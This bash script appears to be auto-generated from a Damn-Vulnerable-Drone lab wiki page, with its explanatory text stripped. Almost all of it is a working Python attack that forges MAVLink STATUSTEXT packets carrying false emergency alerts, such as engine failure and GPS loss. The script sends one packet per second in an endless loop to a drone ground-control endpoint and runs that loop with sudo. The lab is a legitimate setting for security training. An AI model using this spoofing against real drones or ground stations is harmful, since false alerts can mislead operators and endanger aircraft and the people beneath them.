#!/usr/bin/env bash
set -euo pipefail
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ printf '[%(%F_%T)T] %s
' -1 "$*"; }
fi

# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Emergency-Status-Spoofing.md
# Created: 2025-09-10 04:31:52
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=emergency-status-spoofing src=Emergency-Status-Spoofing.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

def create_statustext(severity, text):
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.statustext_encode(
        severity=severity,
        text=text.encode('utf-8')
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python emergency-status-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    messages = [
        (0, "EMERGENCY: Immediate action required"),
        (1, "ALERT: Attention needed"),
        (2, "CRITICAL: Engine failure"),
        (3, "ERROR: GPS signal lost"),
        (4, "WARNING: High temperature detected"),
        (5, "NOTICE: System check complete"),
        (6, "INFO: Battery at 50%"),
        (7, "DEBUG: Diagnostic mode enabled")
    ]

    while True:
        severity, message = random.choice(messages)
        packet = create_statustext(severity, message)
        send_mavlink_packet(packet, target_ip, target_port)
        print(f"Sent STATUSTEXT packet with severity {severity} and message '{message}' to {target_ip}:{target_port}")
        time.sleep(1)
PY

log "[BLOCK 2] type=shell"
sudo python3 emergency-status-spoofing.py 10.13.0.6:14550

